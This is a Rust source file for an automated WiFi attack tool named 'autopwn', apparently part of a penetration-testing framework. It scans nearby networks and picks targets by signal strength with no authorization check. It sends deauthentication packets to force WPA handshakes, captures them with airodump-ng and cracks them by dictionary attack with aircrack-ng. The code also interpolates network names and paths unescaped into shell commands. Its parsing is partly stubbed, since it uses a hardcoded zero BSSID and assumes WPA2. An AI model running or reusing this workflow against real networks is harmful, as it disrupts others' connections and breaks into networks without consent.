//! Autopwn - Automated WiFi penetration testing tool
//!
//! Orchestrates a complete WPA/WPA2 attack workflow:
//! 1. Scan for WiFi networks
//! 2. Filter targets by security type
//! 3. Enable monitor mode on wireless interface
//! 4. Capture WPA handshake via deauth attack
//! 5. Crack handshake with dictionary attack

use async_trait::async_trait;
use pentest_core::error::{Error, Result};
use pentest_core::tools::{execute_timed, ParamType, PentestTool, Platform, ToolContext, ToolParam, ToolResult, ToolSchema};
use pentest_platform::{get_platform, CommandExec};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::time::Duration;
use tokio::time::sleep;

/// Autopwn tool for automated WiFi attacks
pub struct AutopwnTool;

/// Configuration for autopwn execution
#[derive(Debug, Clone, Deserialize)]
struct AutopwnConfig {
    /// Wireless interface to use (e.g., wlan0)
    #[serde(default)]
    interface: Option<String>,

    /// Minimum signal strength to target (-100 to 0 dBm)
    #[serde(default = "default_min_signal")]
    min_signal: i32,

    /// Path to wordlist file for cracking
    #[serde(default)]
    wordlist: Option<String>,

    /// Maximum number of targets to attempt
    #[serde(default = "default_max_targets")]
    max_targets: usize,

    /// Stop after first successful crack
    #[serde(default = "default_stop_on_success")]
    stop_on_success: bool,

    /// Handshake capture timeout in seconds
    #[serde(default = "default_handshake_timeout")]
    handshake_timeout: u32,

    /// Number of deauth packets to send
    #[serde(default = "default_deauth_count")]
    deauth_count: u32,
}

fn default_min_signal() -> i32 { -70 }
fn default_max_targets() -> usize { 5 }
fn default_stop_on_success() -> bool { true }
fn default_handshake_timeout() -> u32 { 120 }
fn default_deauth_count() -> u32 { 10 }

impl Default for AutopwnConfig {
    fn default() -> Self {
        Self {
            interface: None,
            min_signal: default_min_signal(),
            wordlist: None,
            max_targets: default_max_targets(),
            stop_on_success: default_stop_on_success(),
            handshake_timeout: default_handshake_timeout(),
            deauth_count: default_deauth_count(),
        }
    }
}

/// State of the autopwn workflow
/// Note: Planned for future state machine implementation
#[allow(dead_code)]
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "snake_case")]
enum AutopwnState {
    Initializing,
    Scanning,
    TargetSelection { networks: Vec<NetworkInfo> },
    PreparingInterface { interface: String },
    Attacking { target: NetworkInfo, attempt: usize },
    CapturingHandshake { target: NetworkInfo },
    Cracking { target: NetworkInfo, handshake_file: String },
    Success { target: NetworkInfo, password: String },
    Failed { target: NetworkInfo, reason: String },
    Complete { results: Vec<AttackResult> },
}

/// Information about a WiFi network
#[derive(Debug, Clone, Serialize, Deserialize)]
struct NetworkInfo {
    ssid: String,
    bssid: String,
    channel: u32,
    signal_strength: i32,
    security: String,
}

/// Result of an attack attempt
#[derive(Debug, Clone, Serialize)]
struct AttackResult {
    ssid: String,
    bssid: String,
    success: bool,
    password: Option<String>,
    error: Option<String>,
}

#[async_trait]
impl PentestTool for AutopwnTool {
    fn name(&self) -> &str {
        "autopwn"
    }

    fn description(&self) -> &str {
        "Automated WiFi penetration testing - scans networks, captures WPA handshakes, and performs dictionary attacks"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema::new(self.name(), self.description())
            .platforms(vec![Platform::Desktop]) // Linux-only for now
            .param(ToolParam::optional(
                "interface",
                ParamType::String,
                "Wireless interface to use (auto-detected if not specified)",
                json!(null),
            ))
            .param(ToolParam::optional(
                "min_signal",
                ParamType::Integer,
                "Minimum signal strength to target in dBm (-100 to 0)",
                json!(-70),
            ))
            .param(ToolParam::optional(
                "wordlist",
                ParamType::String,
                "Path to wordlist file for password cracking",
                json!(null),
            ))
            .param(ToolParam::optional(
                "max_targets",
                ParamType::Integer,
                "Maximum number of targets to attempt",
                json!(5),
            ))
            .param(ToolParam::optional(
                "stop_on_success",
                ParamType::Boolean,
                "Stop after first successful crack",
                json!(true),
            ))
            .param(ToolParam::optional(
                "handshake_timeout",
                ParamType::Integer,
                "Handshake capture timeout in seconds",
                json!(120),
            ))
            .param(ToolParam::optional(
                "deauth_count",
                ParamType::Integer,
                "Number of deauth packets to send",
                json!(10),
            ))
    }

    fn supported_platforms(&self) -> Vec<Platform> {
        vec![Platform::Desktop] // Linux-only initially
    }

    async fn execute(&self, params: Value, ctx: &ToolContext) -> Result<ToolResult> {
        execute_timed(|| async {
            let config: AutopwnConfig = serde_json::from_value(params)
                .unwrap_or_default();

            // Check for root privileges
            check_root_privileges().await?;

            // Verify aircrack-ng suite is installed
            check_aircrack_installed().await?;

            // Run the autopwn workflow
            let results = run_autopwn_workflow(config, ctx).await?;

            Ok(json!({
                "results": results,
                "total_attempts": results.len(),
                "successful_cracks": results.iter().filter(|r| r.success).count(),
            }))
        })
        .await
    }
}

/// Check if running with root privileges
async fn check_root_privileges() -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        let platform = get_platform();
        let output = platform
            .execute_command("id", &["-u"], Duration::from_secs(5))
            .await?;

        if let Ok(uid) = output.stdout.trim().parse::<u32>() {
            if uid != 0 {
                return Err(Error::ToolExecution(
                    "Autopwn requires root privileges inside sandbox (this should not happen - we're in a user namespace as UID 0)".to_string()
                ));
            }
        }
    }

    Ok(())
}

/// Check if aircrack-ng suite is installed
async fn check_aircrack_installed() -> Result<()> {
    let platform = get_platform();

    let tools = vec!["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"];

    for tool in tools {
        let output = platform
            .execute_command("which", &[tool], Duration::from_secs(5))
            .await?;

        if output.exit_code != 0 {
            return Err(Error::ToolExecution(
                format!(
                    "Required tool '{}' not found. Install aircrack-ng suite: pacman -S aircrack-ng (inside BlackArch rootfs)",
                    tool
                )
            ));
        }
    }

    Ok(())
}

/// Main autopwn workflow orchestration
async fn run_autopwn_workflow(
    config: AutopwnConfig,
    _ctx: &ToolContext,
) -> Result<Vec<AttackResult>> {
    let mut results = Vec::new();

    // Step 1: Detect/verify wireless interface
    let interface = match &config.interface {
        Some(iface) => iface.clone(),
        None => detect_wireless_interface().await?,
    };

    tracing::info!("Using wireless interface: {}", interface);

    // Step 2: Scan for WiFi networks
    tracing::info!("Scanning for WiFi networks...");
    let networks = scan_networks(&interface).await?;

    if networks.is_empty() {
        return Err(Error::ToolExecution("No WiFi networks found".to_string()));
    }

    // Step 3: Filter targets by security and signal strength
    let targets = filter_targets(networks, config.min_signal, config.max_targets);

    if targets.is_empty() {
        return Err(Error::ToolExecution(
            format!("No suitable targets found (min signal: {} dBm)", config.min_signal)
        ));
    }

    tracing::info!("Found {} potential targets", targets.len());

    // Step 4: Enable monitor mode
    let monitor_interface = enable_monitor_mode(&interface).await?;
    tracing::info!("Monitor mode enabled on {}", monitor_interface);

    // Step 5: Attack each target
    for (idx, target) in targets.iter().enumerate() {
        tracing::info!(
            "[{}/{}] Attacking {} ({})",
            idx + 1,
            targets.len(),
            target.ssid,
            target.bssid
        );

        let result = attack_target(target, &monitor_interface, &config).await;

        match result {
            Ok(password) => {
                tracing::info!("✓ Successfully cracked {}: {}", target.ssid, password);
                results.push(AttackResult {
                    ssid: target.ssid.clone(),
                    bssid: target.bssid.clone(),
                    success: true,
                    password: Some(password),
                    error: None,
                });

                if config.stop_on_success {
                    break;
                }
            }
            Err(e) => {
                tracing::warn!("✗ Failed to crack {}: {}", target.ssid, e);
                results.push(AttackResult {
                    ssid: target.ssid.clone(),
                    bssid: target.bssid.clone(),
                    success: false,
                    password: None,
                    error: Some(e.to_string()),
                });
            }
        }
    }

    // Step 6: Restore managed mode
    let _ = disable_monitor_mode(&monitor_interface, &interface).await;

    Ok(results)
}

/// Detect available wireless interface
async fn detect_wireless_interface() -> Result<String> {
    let platform = get_platform();

    // Use iw to list wireless interfaces
    let output = platform
        .execute_command("sh", &["-c", "iw dev | grep Interface | awk '{print $2}'"], Duration::from_secs(10))
        .await?;

    if output.exit_code != 0 || output.stdout.trim().is_empty() {
        return Err(Error::ToolExecution(
            "No wireless interface found. Ensure WiFi adapter is connected.".to_string()
        ));
    }

    let interface = output.stdout.lines().next().unwrap_or("").trim().to_string();

    if interface.is_empty() {
        return Err(Error::ToolExecution("No wireless interface detected".to_string()));
    }

    Ok(interface)
}

/// Scan for WiFi networks using iw or airmon-ng
async fn scan_networks(interface: &str) -> Result<Vec<NetworkInfo>> {
    let platform = get_platform();

    // Use iw for scanning (works in managed mode)
    let cmd = format!("iw dev {} scan | grep -E 'SSID:|signal:|freq:|DS Parameter set'", interface);
    let output = platform
        .execute_command("sh", &["-c", &cmd], Duration::from_secs(30))
        .await?;

    if output.exit_code != 0 {
        return Err(Error::ToolExecution(format!(
            "WiFi scan failed: {}",
            output.stderr
        )));
    }

    // Parse scan results (simplified - in real implementation, parse more thoroughly)
    let mut networks = Vec::new();
    let lines: Vec<&str> = output.stdout.lines().collect();

    let mut current_ssid = None;
    let mut current_signal = None;
    let mut current_channel = None;

    for line in lines {
        let line = line.trim();

        if line.starts_with("SSID:") {
            current_ssid = Some(line.trim_start_matches("SSID:").trim().to_string());
        } else if line.contains("signal:") {
            if let Some(signal_str) = line.split("signal:").nth(1) {
                if let Some(signal) = signal_str.trim().split_whitespace().next()
                    .and_then(|s| s.parse::<i32>().ok()) {
                    current_signal = Some(signal);
                }
            }
        } else if line.contains("DS Parameter set: channel") {
            if let Some(channel_str) = line.split("channel").nth(1) {
                if let Ok(channel) = channel_str.trim().parse::<u32>() {
                    current_channel = Some(channel);
                }
            }
        }

        // If we have all info, create network entry
        if let (Some(ssid), Some(signal), Some(channel)) =
            (current_ssid.as_ref(), current_signal, current_channel) {
            if !ssid.is_empty() {
                networks.push(NetworkInfo {
                    ssid: ssid.clone(),
                    bssid: "00:00:00:00:00:00".to_string(), // Will be updated
                    channel,
                    signal_strength: signal,
                    security: "WPA2".to_string(), // Simplified
                });
                current_ssid = None;
                current_signal = None;
                current_channel = None;
            }
        }
    }

    Ok(networks)
}

/// Filter targets by security type and signal strength
fn filter_targets(
    networks: Vec<NetworkInfo>,
    min_signal: i32,
    max_targets: usize,
) -> Vec<NetworkInfo> {
    let mut targets: Vec<_> = networks
        .into_iter()
        .filter(|n| {
            // Only target WPA/WPA2 networks with sufficient signal
            (n.security.contains("WPA") || n.security.contains("WPA2"))
                && n.signal_strength >= min_signal
                && !n.ssid.is_empty()
        })
        .collect();

    // Sort by signal strength (strongest first)
    targets.sort_by(|a, b| b.signal_strength.cmp(&a.signal_strength));

    // Limit to max_targets
    targets.truncate(max_targets);

    targets
}

/// Enable monitor mode on wireless interface
async fn enable_monitor_mode(interface: &str) -> Result<String> {
    let platform = get_platform();

    // Kill interfering processes
    let _ = platform
        .execute_command("sh", &["-c", "airmon-ng check kill"], Duration::from_secs(10))
        .await;

    // Enable monitor mode
    let cmd = format!("airmon-ng start {}", interface);
    let output = platform
        .execute_command("sh", &["-c", &cmd], Duration::from_secs(15))
        .await?;

    if output.exit_code != 0 {
        return Err(Error::ToolExecution(format!(
            "Failed to enable monitor mode: {}",
            output.stderr
        )));
    }

    // Monitor interface is typically wlan0mon or wlan0 with mon suffix
    let monitor_iface = format!("{}mon", interface);

    Ok(monitor_iface)
}

/// Disable monitor mode and restore managed mode
async fn disable_monitor_mode(monitor_interface: &str, _original_interface: &str) -> Result<()> {
    let platform = get_platform();

    let cmd = format!("airmon-ng stop {}", monitor_interface);
    let _ = platform
        .execute_command("sh", &["-c", &cmd], Duration::from_secs(10))
        .await?;

    // Restart NetworkManager if available
    let _ = platform
        .execute_command("sh", &["-c", "systemctl restart NetworkManager"], Duration::from_secs(10))
        .await;

    Ok(())
}

/// Attack a specific target network
async fn attack_target(
    target: &NetworkInfo,
    monitor_interface: &str,
    config: &AutopwnConfig,
) -> Result<String> {
    // Step 1: Capture handshake
    let handshake_file = capture_handshake(target, monitor_interface, config).await?;

    // Step 2: Crack with wordlist
    if let Some(wordlist) = &config.wordlist {
        crack_handshake(&handshake_file, wordlist).await
    } else {
        Err(Error::ToolExecution(
            "No wordlist specified. Cannot crack handshake.".to_string()
        ))
    }
}

/// Capture WPA handshake for target network
async fn capture_handshake(
    target: &NetworkInfo,
    monitor_interface: &str,
    config: &AutopwnConfig,
) -> Result<String> {
    let platform = get_platform();
    let output_prefix = format!("/tmp/autopwn_{}", target.bssid.replace(":", ""));

    // Start airodump-ng to capture handshake (in background via sh -c with & and timeout)
    let airodump_cmd = format!(
        "timeout {}s airodump-ng -c {} --bssid {} -w {} {} > /dev/null 2>&1 &",
        config.handshake_timeout,
        target.channel,
        target.bssid,
        output_prefix,
        monitor_interface
    );

    tracing::info!("Starting handshake capture for {} seconds...", config.handshake_timeout);

    let _ = platform
        .execute_command("sh", &["-c", &airodump_cmd], Duration::from_secs(5))
        .await;

    // Sleep briefly to let airodump start
    sleep(Duration::from_secs(2)).await;

    // Send deauth packets to force handshake
    tracing::info!("Sending {} deauth packets...", config.deauth_count);
    let deauth_cmd = format!(
        "aireplay-ng --deauth {} -a {} {}",
        config.deauth_count,
        target.bssid,
        monitor_interface
    );

    let _ = platform
        .execute_command("sh", &["-c", &deauth_cmd], Duration::from_secs(30))
        .await?;

    // Wait for capture to complete
    sleep(Duration::from_secs(config.handshake_timeout as u64)).await;

    // Check if handshake was captured
    let cap_file = format!("{}-01.cap", output_prefix);

    if !std::path::Path::new(&cap_file).exists() {
        return Err(Error::ToolExecution("Handshake capture file not found".to_string()));
    }

    // Verify handshake with aircrack-ng
    let verify_cmd = format!("aircrack-ng {} 2>&1 | grep -i handshake", cap_file);
    let verify_output = platform
        .execute_command("sh", &["-c", &verify_cmd], Duration::from_secs(10))
        .await?;

    if verify_output.stdout.is_empty() {
        return Err(Error::ToolExecution("No handshake captured".to_string()));
    }

    tracing::info!("Handshake captured successfully!");
    Ok(cap_file)
}

/// Crack WPA handshake using dictionary attack
async fn crack_handshake(handshake_file: &str, wordlist: &str) -> Result<String> {
    let platform = get_platform();

    tracing::info!("Starting dictionary attack with wordlist: {}", wordlist);

    let cmd = format!("aircrack-ng -w {} {} 2>&1", wordlist, handshake_file);
    let output = platform
        .execute_command("sh", &["-c", &cmd], Duration::from_secs(600))
        .await?;

    // Parse output for KEY FOUND
    if let Some(line) = output.stdout.lines().find(|l| l.contains("KEY FOUND")) {
        // Extract password from line like: KEY FOUND! [ password123 ]
        if let Some(password) = line.split('[').nth(1) {
            let password = password.trim_end_matches(']').trim();
            return Ok(password.to_string());
        }
    }

    Err(Error::ToolExecution("Password not found in wordlist".to_string()))
}
